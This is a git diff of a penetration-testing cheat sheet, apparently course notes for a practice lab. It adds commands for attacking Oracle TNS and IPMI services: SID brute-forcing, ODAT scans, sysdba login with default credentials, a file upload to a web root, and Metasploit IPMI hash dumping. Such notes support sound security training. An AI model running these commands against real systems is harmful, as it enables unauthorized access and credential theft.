@@ -307,15 +307,15 @@ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 ```
 | Command	| Description	|
 |----------|----------------|
-| mysql -u <user> -p<password> -h <IP address>	| Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. | 
+| mysql -u \<user\> -p\<password\> -h \<IP address\>	| Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. | 
 | show databases;	| Show all databases. | 
-| use <database>;	| Select one of the existing databases. | 
+| use \<database\>;	| Select one of the existing databases. | 
 | show tables;	| Show all available tables in the selected database. | 
-| show columns from <table>;	| Show all columns in the selected database. | 
-| select * from <table>;	| Show everything in the desired table. | 
-| select * from <table> where <column> = "<string>";	| Search for needed string in the desired table. | 
+| show columns from \<table\>;	| Show all columns in the selected database. | 
+| select * from \<table\>;	| Show everything in the desired table. | 
+| select * from \<table\> where <column> = "\<string\>";	| Search for needed string in the desired table. | 
 
-**Many other clients can be used to access a database running on MSSQL. Including but not limited to:**
+**Many other clients can be used to access a database running on MSSQL. Including but not limited to:** <br>
 mssql-cli,	SQL Server PowerShell,	HediSQL,	SQLPro,	Impacket's mssqlclient.py
 
 ### Connecting with mssqlclient.py
@@ -448,4 +448,52 @@ Identify linked Servers in MSSQL
 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 2> GO
 ```
-
+## Oracle TNS
+### Fingerprinting the Service
+```
+sudo nmap -p1521 -sV 10.129.204.235 --open
+```
+### Nmap - SID Bruteforcing
+```
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+```
+### ODAT
+```
+./odat.py all -s 10.129.204.235
+```
+### SQLplus - Log In
+```
+sqlplus scott/tiger@10.129.204.235/XE;
+```
+```
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+### Oracle RDBMS - Database Enumeration
+```
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+### Oracle RDBMS - File Upload
+```
+echo "Oracle File Upload Test" > testing.txt
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+```
+curl -X GET http://10.129.204.235/testing.txt
+```
+## IPMI
+### Footprinting the Service
+```
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+```
+### Metasploit Version scan
+```
+msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
+```
+### Metasploit Dumping Hashes
+```
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
+```
